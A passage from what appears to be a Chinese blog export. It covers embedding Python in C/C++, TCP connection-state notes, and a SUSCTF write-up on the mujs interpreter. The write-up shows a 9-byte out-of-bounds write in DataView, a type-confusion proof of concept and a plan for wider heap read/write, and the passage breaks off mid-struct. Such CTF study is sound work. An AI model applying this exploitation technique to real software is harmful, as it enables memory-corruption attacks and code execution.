class="keyword">void</span> *兼容)作为其参数，并应返回“新”Python对象，如果发生错误则返回<span class="literal">NULL</span>。</span><br><span class="line"></span><br><span class="line">(items) (tuple) [matching-items] </span><br><span class="line">将一系列C值转换为具有相同项目数的Python元组。</span><br><span class="line"></span><br><span class="line">[items](<span class="built_in">list</span>) [matching-items]</span><br><span class="line">将一系列C值转换为具有相同项目数的Python列表。</span><br><span class="line"></span><br><span class="line">&#123;items&#125;(dict) [matching-items] </span><br><span class="line">将一系列C值转换为Python字典。每对连续的C值将一个项添加到字典中，分别用作键和值。</span><br><span class="line">如果格式字符串中存在错误，则设置SystemError异常并返回<span class="literal">NULL</span>。</span><br></pre></td></tr></table></figure>

<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>python函数的返回值也是PyObject类型，因此，在python脚本返回到C/C++之后，需要解构Python数据为C的类型，这样C/C++程序中才可以使用Python里的数据。但是，由于python的返回值有多种数据结构类型，因此，我们需要为每个类型进行转换。不过由于篇幅问题，我们只是介绍简单的整形和字符串类型的处理，其他类型的返回见文末的github链接，总体思路都是根据类型逐个从值从PyObject中提取。python提供了下面函数来完成这个功能</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PyArg_Parse</span><span class="params">( PyObject *args, <span class="keyword">char</span> *format, ...)</span></span></span><br><span class="line">     根据format把args的值转换成c类型的值，format接受的类型和上述Py_BuildValue()的是一样的</span><br></pre></td></tr></table></figure>

<h4 id="释放资源"><a href="#释放资源" class="headerlink" title="释放资源"></a>释放资源</h4><p>Python使用引用计数机制对内存进行管理，实现自动垃圾回收。在C/C++中使用Python对象时，应正确地处理引用计数，否则容易导致内存泄漏。在Python/C API中提供了Py_CLEAR()、Py_DECREF()等宏来对引用计数进行操作。<br>当使用Python/C API中的函数创建列表、元组、字典等后，就在内存中生成了这些对象的引用计数。在对其完成操作后应该使用Py_CLEAR()、Py_DECREF()等宏来销毁这些对象。其原型分别如下所示</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Py_CLEAR</span><span class="params">(PyObject *o)</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Py_DECREF</span><span class="params">(PyObject *o)</span></span></span><br><span class="line">其中，o的含义是要进行操作的对象。</span><br><span class="line">对于Py_CLEAR()其参数可以为<span class="literal">NULL</span>指针，此时，Py_CLEAR()不进行任何操作。而对于Py_DECREF()其参数不能为<span class="literal">NULL</span>指针，否则将导致错误。</span><br></pre></td></tr></table></figure>

<p>下面是个简单的例子，在例子中会有输出和返回值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">cat script/Py2Cpp.py</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">def add_num(a,b):</span></span><br><span class="line"><span class="comment">	return a+b</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;python2.7/Python.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	Py_Initialize();</span><br><span class="line">	<span class="keyword">if</span>( !Py_IsInitialized())&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">"python init fail"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	PyRun_SimpleString(<span class="string">"import sys"</span>);</span><br><span class="line">	PyRun_SimpleString(<span class="string">"sys.path.append('./script')"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	PyObject* moduleName = PyString_FromString(<span class="string">"Py2Cpp"</span>);</span><br><span class="line">	PyObject* pModule = PyImport_Import(moduleName);</span><br><span class="line">	<span class="keyword">if</span>( pModule == <span class="literal">NULL</span> )&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt;<span class="string">"module not found"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PyObject* pFunc = PyObject_GetAttrString(pModule, <span class="string">"add_num"</span>);</span><br><span class="line">	<span class="keyword">if</span>( !pFunc || !PyCallable_Check(pFunc))&#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt;<span class="string">"not found function add_num"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	PyObject* args = Py_BuildValue(<span class="string">"(ii)"</span>, <span class="number">28</span>, <span class="number">103</span>);</span><br><span class="line">	PyObject* pRet = PyObject_CallObject(pFunc, args );</span><br><span class="line">        Py_DECREF(args);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">	PyArg_Parse(pRet, <span class="string">"i"</span>, &amp;res );</span><br><span class="line">        Py_DECREF(pRet);</span><br><span class="line">	<span class="built_in">cout</span> &lt;&lt; res &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">	Py_Finalize();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2-3-调用类中的函数"><a href="#2-3-调用类中的函数" class="headerlink" title="2.3 调用类中的函数"></a>2.3 调用类中的函数</h3><p>大概流程是：</p>
<p>第一步，导入python文件，如前文所述</p>
<p>第二步，导入已经导入的模块的方法或类</p>
<p>第三步，使用导入的方法或类</p>
<p>第四步，释放资源</p>
<p>下面结合具体例子来分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">Py_Initialize();</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">if</span> (!Py_IsInitialized())&#123;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"Inital failed \n"</span>);</span><br><span class="line">       <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   PyGC_Collect();</span><br><span class="line">   PyRun_SimpleString(<span class="string">"import sys"</span>);</span><br><span class="line">   PyRun_SimpleString(<span class="string">"sys.path.append('../src/decrpt_func/')"</span>);</span><br><span class="line">   </span><br><span class="line">   <span class="comment">//import testpy.py</span></span><br><span class="line">   <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"Called"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">   PyObject *pModule = PyImport_ImportModule(<span class="string">"testpy"</span>);</span><br><span class="line">   <span class="keyword">if</span>(!pModule) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" Moudle load worong"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">	<span class="comment">//使用PyObject* pDict来存储导入模块中的方法字典, 调用的方法是PyModule_GetDict(module):  PyObject* pDict = PyModule_GetDict(pModule); </span></span><br><span class="line">   PyObject *pDict = PyModule_GetDict(pModule);</span><br><span class="line">   <span class="keyword">if</span> (!pDict) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" Dict worong"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//使用PyDict_GetItemString可以获得该模块中的方法或类，此处导入了Person类</span></span><br><span class="line">   PyObject *pClass = PyDict_GetItemString(pDict, <span class="string">"Person"</span>);</span><br><span class="line">   <span class="keyword">if</span>(!pClass) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" class worong"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="comment">//使用PyInstanceMethod_New获取了类的构造函数方法</span></span><br><span class="line">   PyObject *pConstruct = PyInstanceMethod_New(pClass);</span><br><span class="line">   <span class="keyword">if</span>(! pConstruct) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">" construct woronbg"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125;</span><br><span class="line">	<span class="comment">//使用PyObject_CallObject调用类的构造函数方法，同时生成示例instance</span></span><br><span class="line">   PyObject *pInstance = PyObject_CallObject(pConstruct, <span class="literal">NULL</span>);</span><br><span class="line">   <span class="keyword">this</span>-&gt;pInstance = pInstance;</span><br><span class="line">   <span class="keyword">if</span> (!pInstance) &#123;</span><br><span class="line">       <span class="built_in">std</span>::<span class="built_in">cerr</span> &lt;&lt; <span class="string">"  Person instance failed"</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">   &#125; </span><br><span class="line">	<span class="comment">//使用Person类对象的auth方法</span></span><br><span class="line">	PyObject_CallMethod(<span class="keyword">this</span>-&gt;pInstance, <span class="string">"auth"</span>, <span class="string">"(ss)"</span>, <span class="string">"admin"</span>, <span class="string">"123qwe"</span>);</span><br><span class="line">	<span class="comment">//如果调用时python出现错误，那么输出</span></span><br><span class="line">   PyErr_Print(); </span><br><span class="line">	<span class="comment">//释放</span></span><br><span class="line">   Py_DECREF(pInstance);</span><br><span class="line">   Py_DECREF(pClass);</span><br><span class="line">   Py_DECREF(pDict);</span><br><span class="line">   Py_DECREF(pModule);</span><br><span class="line">	<span class="comment">// 关闭虚拟机</span></span><br><span class="line">	Py_Finalize();</span><br></pre></td></tr></table></figure>

<h2 id="0x03-遇到的问题"><a href="#0x03-遇到的问题" class="headerlink" title="0x03 遇到的问题"></a>0x03 遇到的问题</h2><p>类似于下图这种会出现内存泄漏</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Python.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">"Python version: "</span> &lt;&lt; PY_VERSION &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        Py_Initialize();</span><br><span class="line">        <span class="comment">//PyGC_Collect();</span></span><br><span class="line">        Py_Finalize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>[解决方案](<a href="https://stackoverflow.com/questions/42971734/memory-leak-when-embedding-python-into-my-application" target="_blank" rel="noopener">c++ - Memory leak when embedding python into my application - Stack Overflow</a>)</p>
<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>[C++调用python脚本 - 知乎 (zhihu.com)](<a href="https://zhuanlan.zhihu.com/p/79896193#:~:text=C%2FC%2B%2B中调用,的所有初始化，" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/79896193#:~:text=C%2FC%2B%2B中调用,的所有初始化，</a> 并销毁)</p>
<p><a href="https://blog.csdn.net/hnlylyb/article/details/89498651" target="_blank" rel="noopener">C调用python类的正确方法_hnlylyb的博客-CSDN博客_c调用python类的正确方法</a></p>
<p><a href="https://www.cnblogs.com/lancelod/p/4036922.html" target="_blank" rel="noopener">[C++/Python] 如何在C++中使用一个Python类? (Use Python-defined class in C++) - Lancelod_Liu - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.xmodulo.com/embed-python-code-in-c.html" target="_blank" rel="noopener">How to embed Python code in C program (xmodulo.com)</a></p>
]]></content>
      <tags>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>TCP/IP协议安全问题</title>
    <url>/year/07/01/cl7iordp3001g293fb31by45p/</url>
    <content><![CDATA[<p>学习一下tcp阻断。</p>
<a id="more"></a>
<h1 id="TCP基础知识"><a href="#TCP基础知识" class="headerlink" title="TCP基础知识"></a>TCP基础知识</h1><h2 id="1-1-TCP报文格式"><a href="#1-1-TCP报文格式" class="headerlink" title="1.1 TCP报文格式"></a>1.1 TCP报文格式</h2><p><img src="https://zhangbinalan.gitbooks.io/protocol/content/Center.gif" alt></p>
<p>在TCP/IP 连接中比较重要的有</p>
<ul>
<li>源端口</li>
<li>目的端口</li>
<li>数据序号</li>
<li>确认序号</li>
<li>源IP</li>
<li>目的IP</li>
</ul>
<h2 id="1-2-TCP链接状态"><a href="#1-2-TCP链接状态" class="headerlink" title="1.2 TCP链接状态"></a>1.2 TCP链接状态</h2><p>​    <img src="https://pic.imgdb.cn/item/62be68f41d64b0706681fde1.png" alt></p>
<p>TCP连接生命周期状态：</p>
<ul>
<li>LISTEN等待远程的TCP连接请求</li>
<li>SYS_SENT 发送了建立连接的请求，等待确认消息</li>
<li>SYN_RECIVED 收到了对方建立连接的请求并发送了建立连接的请求。等待对方确认自己发送的链接请求</li>
<li>ESTABLISHED 连接已经建立，可以进行正常数据传输</li>
<li>FIN_WAIT_1 等待对方确认刚刚发送的关闭连接的请求</li>
<li>FIN_WAIT_2 收到关闭连接请求的确认，等待对方发送关闭连接的请求</li>
<li>CLOSE_WAIT确认了对方的关闭连接请求，等待本地用户关闭连接指令</li>
<li>LAST-ACK 被动关闭的一方，在CLOSE-WAIT状态下收到用户关闭连接的指令，发送关闭连接请求，等待确认</li>
<li>TIME-WAIT 主动关闭连接的一方收到对方发送的对方关闭连接请求的确认消息后,等待足够长的时间（2MSL）以确保对方接收到ACK包.最后回到CLOSED状态，释放网络资源</li>
<li>CLOSED 关闭状态</li>
</ul>
<h2 id="1-3-三次握手"><a href="#1-3-三次握手" class="headerlink" title="1.3 三次握手"></a>1.3 三次握手</h2><p>​    <img src="https://pic.imgdb.cn/item/62c25ea05be16ec74ad66e54.png" alt></p>
<p>（1）第一次握手：建立连接时，客户端A发送SYN包（SYN=j）到服务器B，并进入SYN_SEND状态，等待服务器B确认。</p>
<p>（2）第二次握手：服务器B收到SYN包，必须确认客户A的SYN（ACK=j+1），同时自己也发送一个SYN包（SYN=k），即SYN+ACK包，此时服务器B进入SYN_RECV状态。</p>
<p>（3）第三次握手：客户端A收到服务器B的SYN＋ACK包，向服务器B发送确认包ACK（ACK=k+1），此包发送完毕，客户端A和服务器B进入ESTABLISHED状态，完成三次握手。</p>
<h2 id="1-4-四次挥手"><a href="#1-4-四次挥手" class="headerlink" title="1.4 四次挥手"></a>1.4 四次挥手</h2><p><img src="https://pic.imgdb.cn/item/62c25fea5be16ec74ad7d2e6.png" alt></p>
<p>由于TCP连接是全双工的，因此每个方向都必须单独进行关闭。这个原则是当一方完成它的数据发送任务后就能发送一个FIN来终止这个方向的连接。收到一个 FIN只意味着这一方向上没有数据流动，一个TCP连接在收到一个FIN后仍能发送数据。首先进行关闭的一方将执行主动关闭，而另一方执行被动关闭。</p>
<p>CP的连接的拆除需要发送四个包，因此称为四次挥手(four-way handshake)。客户端或服务器均可主动发起挥手动作，在socket编程中，任何一方执行close()操作即可产生挥手操作。</p>
<p>（1）客户端A发送一个FIN，用来关闭客户A到服务器B的数据传送。</p>
<p>（2）服务器B收到这个FIN，它发回一个ACK，确认序号为收到的序号加1。和SYN一样，一个FIN将占用一个序号。</p>
<p>（3）服务器B关闭与客户端A的连接，发送一个FIN给客户端A。</p>
<p>（4）客户端A发回ACK报文确认，并将确认序号设置为收到序号加1。</p>
<p>以上就是TCP协议关闭连接的过程，现在说一下TIME_WAIT状态。<br>从上面可以看到，主动发起关闭连接的操作的一方将达到TIME_WAIT状态，而且这个状态要保持Maximum Segment Lifetime的两倍时间。</p>
<p>原因有二：<br>一、保证TCP协议的全双工连接能够可靠关闭<br>二、保证这次连接的重复数据段从网络中消失</p>
<p>先说第一点，如果Client直接CLOSED了，那么由于IP协议的不可靠性或者是其它网络原因，导致Server没有收到Client最后回复的ACK。那么Server就会在超时之后继续发送FIN，此时由于Client已经CLOSED了，就找不到与重发的FIN对应的连接，最后Server就会收到RST而不是ACK，Server就会以为是连接错误把问题报告给高层。这样的情况虽然不会造成数据丢失，但是却导致TCP协议不符合可靠连接的要求。所以，Client不是直接进入CLOSED，而是要保持TIME_WAIT，当再次收到FIN的时候，能够保证对方收到ACK，最后正确的关闭连接。</p>
<p>再说第二点，如果Client直接CLOSED，然后又再向Server发起一个新连接，我们不能保证这个新连接与刚关闭的连接的端口号是不同的。也就是说有可能新连接和老连接的端口号是相同的。一般来说不会发生什么问题，但是还是有特殊情况出现：假设新连接和已经关闭的老连接端口号是一样的，如果前一次连接的某些数据仍然滞留在网络中，这些延迟数据在建立新连接之后才到达Server，由于新连接和老连接的端口号是一样的，又因为TCP协议判断不同连接的依据是socket pair，于是，TCP协议就认为那个延迟的数据是属于新连接的，这样就和真正的新连接的数据包发生混淆了。所以TCP连接还要在TIME_WAIT状态等待2倍MSL，这样可以保证本次连接的所有数据都从网络中消失。</p>
<h2 id="1-5-TCP-中的-RST"><a href="#1-5-TCP-中的-RST" class="headerlink" title="1.5 TCP 中的 RST"></a>1.5 TCP 中的 RST</h2><p>RST：（Reset the connection）用于复位因某种原因引起出现的错误连接，也用来拒绝非法数据和请求。如果接收到RST位时候，通常发生了某些错误；<br>发送RST包关闭连接时，不必等缓冲区的包都发出去，直接就丢弃缓冲区中的包，发送RST；<br>接收端收到RST包后，也不必发送ACK包来确认。</p>
<h3 id="何时发送RST"><a href="#何时发送RST" class="headerlink" title="何时发送RST"></a>何时发送RST</h3><p>1：如果连接是CLOSE状态，所有收到的包都响应RST，仍然保持CLOSED状态<br>如果收到的是ACK报文，RST取ACK报文的ACK序列号为RST报文的SEQ；如果报文不是ACK报文，RST的SEQ为0且ACK字段为收到的报文SEQ+报文长度；</p>
<p>2：如果连接在non-synchronized状态（LISTEN/SYN-SENT/SYN-RECEIVED），收到的报文ACK的无效的序列号（发送的SYN没有被确认），需要返回RST报文；连接保持原有状态；<br>如果是ACK报文，RST取ACK报文的ACK序列号为RST报文的SEQ；如果报文不是ACK报文，RST的SEQ为0且ACK字段为收到的报文SEQ+报文长度；</p>
<p>3：如果连接在synchronized状态（ESTABLISHED,FIN-WAIT-1, FIN-WAIT-2, CLOSE-WAIT, CLOSING, LAST-ACK, TIME-WAIT）,如果收到不可接受的报文（序列号不在接收窗口内或者ack的字段不正确），只发送一个确认报文（ACK字段为期望ACK的序列号，SEQ为当前发送序列号），状态变保持原样；</p>
<h3 id="收到RST报文如何处理"><a href="#收到RST报文如何处理" class="headerlink" title="收到RST报文如何处理"></a>收到RST报文如何处理</h3><p><strong>收到RST报文，除了SYN-SENT状态，都需要校验SEQ字段是否在接收窗口；SYN-SENT状态下，如果RST的确认了刚刚发送的SYN报文，RST才有效；</strong></p>
<p>校验了RST报文后，如果是在LISTEN状态则保持该状态不需要改变；<br>如果是在SYN-RECIEVED状态且之前在LISTEN状态，恢复为LISTEN状态，如果之前为SYN-RECIEVED状态且之前不是LISTEN状态，则CLOSED；<br>其他状态，关闭连接通知用户，状态变为CLOSED</p>
<h1 id="针对tcp的攻击"><a href="#针对tcp的攻击" class="headerlink" title="针对tcp的攻击"></a>针对tcp的攻击</h1><p>未完待续</p>
]]></content>
      <categories>
        <category>程序员的自我修养</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>SUSCTF mujs 复现</title>
    <url>/year/03/01/cl7iordp6001s293feg6wyrxw/</url>
    <content><![CDATA[<p>这次跟着SU参加SUSCTF取得了第一名的成绩，希望SU战队越来越好！这道mujs当时自己只看出了有越界写操作，想到了可以进行一个类型混淆的利用，但是最后还是队友做出来了。在此记录一下复线思路（翻译一下队友详细的wp）。</p>
<a id="more"></a>

<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>出题人给出的题目描述如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dd0a0972b4428771e6a3887da2210c7c9dd40f9c  </span><br><span class="line">nc 124.71.182.21 9999</span><br></pre></td></tr></table></figure>

<p>在附件中有<code>mujs</code>的源码，这个是一个在嵌入式设备上常用的js代码解释器。这个源码的代码量还是很大的。同时附件里还有一个编译好的二进制文件，以及libc文件。从libc文件可以得知远程的运行环境是libc.2.31</p>
<p>题目描述中给出的这个hash字符告诉我们这个源码是来自于这个hash对应的commit的<code>mujs</code>源码</p>
<p><a href="https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c" target="_blank" rel="noopener">https://github.com/ccxvii/mujs/commit/dd0a0972b4428771e6a3887da2210c7c9dd40f9c</a> </p>
<p>所以使用diff对比了这两个源码。发现主要的差别在两个地方</p>
<ul>
<li>一些内置方法在main.c中被禁用了</li>
<li>新增了dataview.c文件。这个是[DataView](<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/DataView" target="_blank" rel="noopener">DataView - JavaScript | MDN (mozilla.org)</a>)方法的一个简化版的实现</li>
</ul>
<h2 id="寻找漏洞点"><a href="#寻找漏洞点" class="headerlink" title="寻找漏洞点"></a>寻找漏洞点</h2><p>队友的思路首先是从最近的CVE里寻找一些漏洞，但是没有发现有用的信息，所以这个题应该是魔改的这个版本的源码。而且被魔改的部分其实代码量不算大，直接审就好了。</p>
<p>首先我们需要理解DataView都做了什么，都有哪些方法。一些常用的用法如下所示。</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">x = <span class="keyword">new</span> <span class="built_in">DataView</span>(<span class="number">10</span>)</span><br><span class="line">print(x.getUint8(<span class="number">0</span>))</span><br><span class="line">print(x.getUint8(<span class="number">9</span>))</span><br><span class="line">print(x.getUint8(<span class="number">12</span>)) <span class="comment">// should not work</span></span><br><span class="line">print(x.setUint32(<span class="number">0</span>, <span class="number">10</span>))</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p>其实从<code>jsB_initdataview</code>函数当中大概可以看出来都有哪些方法，然后自己试一下就可以试出来这些方法怎么用</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> jsB_initdataview(js_State *J)</span><br><span class="line">&#123;</span><br><span class="line">	js_pushobject(J, J-&gt;DataView_prototype);</span><br><span class="line">	&#123;</span><br><span class="line">		jsB_propf(J, <span class="string">"DataView.prototype.getUint8"</span>, Dv_getUint8, <span class="number">1</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">"DataView.prototype.setUint8"</span>, Dv_setUint8, <span class="number">2</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">"DataView.prototype.getUint16"</span>, Dv_getUint16, <span class="number">1</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">"DataView.prototype.setUint16"</span>, Dv_setUint16, <span class="number">2</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">"DataView.prototype.getUint32"</span>, Dv_getUint32, <span class="number">1</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">"DataView.prototype.setUint32"</span>, Dv_setUint32, <span class="number">2</span>);</span><br><span class="line">		jsB_propf(J, <span class="string">"DataView.prototype.getLength"</span>, Dv_getLength, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	js_newcconstructor(J, jsB_new_DataView, jsB_new_DataView, <span class="string">"DataView"</span>, <span class="number">0</span>);</span><br><span class="line">	js_defglobal(J, <span class="string">"DataView"</span>, JS_DONTENUM);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后经过一阵审计，很容易就能发现这里存在一个越界写操作，可以越界写9字节</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> Dv_setUint8(js_State *J)</span><br><span class="line">&#123;</span><br><span class="line">	js_Object *self = js_toobject(J, <span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (self-&gt;type != JS_CDATAVIEW) js_typeerror(J, <span class="string">"not an DataView"</span>);</span><br><span class="line">	size_t index = js_tonumber(J, <span class="number">1</span>);</span><br><span class="line">	uint8_t value = js_tonumber(J, <span class="number">2</span>);</span><br><span class="line">	<span class="keyword">if</span> (index &lt; self-&gt;u.dataview.length+<span class="number">0x9</span>) &#123;</span><br><span class="line">		self-&gt;u.dataview.data[index] = value;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		js_error(J, <span class="string">"out of bounds access on DataView"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>值得注意的是这里同时也存在一个整数溢出（但是是无符号的)，可以让我们可以前溢9字节。但是由于这里没有什么free的操作，所以很难利用。因此还是后溢9字节可用性高一点。</p>
<h2 id="利用漏洞"><a href="#利用漏洞" class="headerlink" title="利用漏洞"></a>利用漏洞</h2><h3 id="类型混淆"><a href="#类型混淆" class="headerlink" title="类型混淆"></a>类型混淆</h3><p>因为说溢出9字节，这个多出的一字节很容易令人联想到类型混淆。下面是 js_Object 的结构。可见只要溢出一字节就可以覆盖它的type字段。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">js_Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">enum</span> js_Class type;</span><br><span class="line">        <span class="keyword">int</span> extensible;</span><br><span class="line">        js_Property *properties;</span><br><span class="line">        ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面给出类型混淆的poc</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x68</span>);</span><br><span class="line">a = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">b = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line">c = <span class="built_in">DataView</span>(<span class="number">0x48</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(c)</span><br><span class="line">b.setUint8(<span class="number">0x48</span>+<span class="number">8</span>, <span class="number">8</span>); <span class="comment">// change type of c to something</span></span><br><span class="line">print(c)</span><br></pre></td></tr></table></figure>

<p>输出为</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">[object <span class="built_in">DataView</span>]</span><br><span class="line">[object <span class="built_in">String</span>]</span><br></pre></td></tr></table></figure>

<h3 id="越界写Dataview的Length字段"><a href="#越界写Dataview的Length字段" class="headerlink" title="越界写Dataview的Length字段"></a>越界写Dataview的Length字段</h3><p>js_Objec 使用了 C语言里的union结构，所以不同类型可以共用相同的内存。队友的想法是利用与DataView里Length字段占用内存相同的其他类型的字符来修改DataLength。<strong>这样我们就可以扩大任意地址读写的范围，起码可以拓展到整个堆上了，而不仅仅是越界9字节。</strong></p>
<p>整个Js_Objec 结构体如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">js_Object</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">        <span class="keyword">enum</span> js_Class type;</span><br><span class="line">        <span class="keyword">int</span> extensible;</span><br><span class="line">        js_Property *properties;</span><br><span class="line">        <span class="keyword">int</span> count; </span><br><span class="line">        js_Object *prototype;</span><br><span class="line">        <span class="keyword">union</span> &#123;</span><br><span class="line">                <span class="keyword">int</span> boolean;</span><br><span class="line">                <span class="keyword">double</span> number;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="keyword">const</span> <span class="keyword">char</span> *<span class="built_in">string</span>;</span><br><span class="line">                        <span class="keyword">int</span> length;</span><br><span class="line">                &#125; s;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="keyword">int</span> length;</span><br><span class="line">                &#125; a;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        js_Function *function;</span><br><span class="line">                        js_Environment *scope;</span><br><span class="line">                &#125; f;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">                        <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">                        js_CFunction function;</span><br><span class="line">                        js_CFunction constructor;</span><br><span class="line">                        <span class="keyword">int</span> length;</span><br><span class="line">                        <span class="keyword">void</span> *data;</span><br><span class="line">                        js_Finalize finalize;</span><br><span class="line">                &#125; c;</span><br><span class="line">                js_Regexp r;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> 